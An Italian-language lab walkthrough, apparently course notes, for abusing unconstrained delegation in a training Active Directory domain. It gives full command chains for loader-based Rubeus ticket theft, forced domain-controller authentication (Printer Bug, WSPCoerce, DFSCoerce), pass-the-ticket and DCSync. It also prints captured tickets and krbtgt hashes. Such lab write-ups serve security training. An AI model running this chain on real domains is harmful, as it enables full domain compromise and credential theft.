# LEARNING OBJECTIVE15

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. &#x20;Find a server in dcorp domain where Unconstrained Delegation is\
   enabled.
   1. Compromise the server and escalate to Domain Admin privileges.
   2. Escalate to Enterprise Admins privileges by abusing Printer Bug!
2. Additionally, abuse Unconstrained Delegation with MS-WSP and MS-\
   DFSNM.

### SVOLGIMENTO PUNTO 1

Individuiamo un server che ha Unconstrained Delegation abilitata all'interno del dominio dcorp, apriamo il solito prompt (amministrativo)

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tool\PowerView.ps1
```

```powershell
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo individuato <kbd>dcorp-appsrv</kbd> come host che permette Unconstrained Delegation

### SVOLGIMENTO PUNTO 1a

Poiché il prerequisito per l'elevazione dei priviliegi, utilizzando la delega senza restrizioni è disporre dell'accesso amministrativo al computer, dobbiamo compromettere un utente che abbia accesso amministrativo locale su appsrv. Ricordiamo che abbiamo estratto i segreti di <kbd>appadmin, srvadmin e websvc</kbd> da <kbd>dcorp-adminsrv</kbd>. Verifichiamo se qualcuno di loro dispone dei privilegi di amministratore locale su dcorp-appsrv.

Proviamo con <kbd>appadmin</kbd> , apriamo un prompt amministrativo ed eseguiamo Rubeus per chiedere un TGT come utente appadmin tramite il Loader

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Nel nuovo prompt eseguiamo la Invishell,importiamo ed eseguiamo Find-PSRemotingLocalAdminAccess per verificare che l'utente appadmin abbia accesso amminstrativo sul server dcorp-appsrv individuato per l'Unconstrained Delegation Attack

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo conferma dall'output che appadmin ha accesso admin remoto su dcorp-appsrv

### SVOLGIMENTO PUNTO 1b

Adesso usiamo Printer Bug - Eseguendo Rubeus con Loader e winrs

Copiamo Loader su <kbd>dcorp-appsrv</kbd>

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Yd
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Accediamo dcorp-appsrv con winrs

```powershell
winrs -r:dcorp-appsrv cmd
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aggiungiamo l'interfaccia portproxy dal dcorp-appsrv alla studentVM per poter eseguire Rubeus tramite Loader, hostato via hfs sulla studentVM su 172.16.100.60:80

```powershell
netsh portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.60
```

Eseguiamo Rubeus in modalita' Monitor

```powershell
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizzare Printer Bug per la Coercion\
Sulla VM dello studente, utilizzare MS-RPRN per forzare l'autenticazione da dcorp-dc$.

```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tornando nel prompt dove c'e' in esecuzione Rubeus in modalita' Monitor e' possibile recuperare il Ticket (TGT) triggerato tramite PrinterBug

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con il ticket ottenuto possiamo fare DCSync dalla studentVM e recuperare le credenziali dell'account krbtgt

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dopo aver importato il TGT possiamo usare SafetyKatz ed recuperare le credenziali <kbd>krbtgt</kbd>

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO PUNTO 2

Possiamo anche utilizzare il protocollo di ricerca di Windows per abusare della delega senza restrizioni. Si noti che il servizio di ricerca di Windows è abilitato per impostazione predefinita sui computer client, ma non sui server. Per il laboratorio, lo abbiamo configurato sul controller di dominio (è necessario il traffico sulla porta TCP 445 dalla VM dello studente a dcorp-dc e da dcorp-dc a dcorp-appsrv).

Configurare Rubeus in modalità monitor esattamente come abbiamo fatto per il bug della stampante. Sulla VM dello studente, utilizzare il seguente comando per forzare dcorp-dc a connettersi a dcorp-appsrv:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se il target ha il servizio DFS Namespaces in esecuzione, possiamo utilizzarlo anche per la coercizione (è necessario il traffico sulla porta TCP 445 dalla VM dello studente a dcorp-dc e da dcorp-dc a dcorp-appsrv).

```powershell
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Per ottenere i privilegi di Enterprise Admin, è necessario forzare l'autenticazione da mcorp-dc. Eseguire il comando riportato di seguito per ascoltare i ticket mcorp-dc$ su dcorp-appsrv:

```powershell
winrs -r:dcorp-appsrv cmd
```

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Utilizzare MS-RPRN sulla VM dello studente per attivare l'autenticazione da mcorp-dc a dcorp-appsrv.

```powershell
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Sul promp di appadmin su dcorp-appsrv e' possibile vedere il ticket (TGT)

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Come in precedenza, copiare il ticket codificato in base64 e utilizzarlo con Rubeus sulla VM dello studente. Esegui il comando riportato di seguito da una shell con privilegi elevati, poiché il comando SafetyKatz che utilizzeremo per DCSync deve essere eseguito da un processo con privilegi elevati:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
```

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

A questo punto possiamo eseguire DCSync da questo stesso processo

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Credenziali

dcorp\krbtgt--> NTLM 4e9815869d2090ccfca61c1fe0d23986, aes256 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848, SID S-1-5-21-719815819-3726368948-3917688648-502

mcorp\krbtgt--> NTLM a0981492d5dfab1ae0b97b51ea895ddf, aes256 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e, SID S-1-5-21-335606122-960912869-3279953914-502
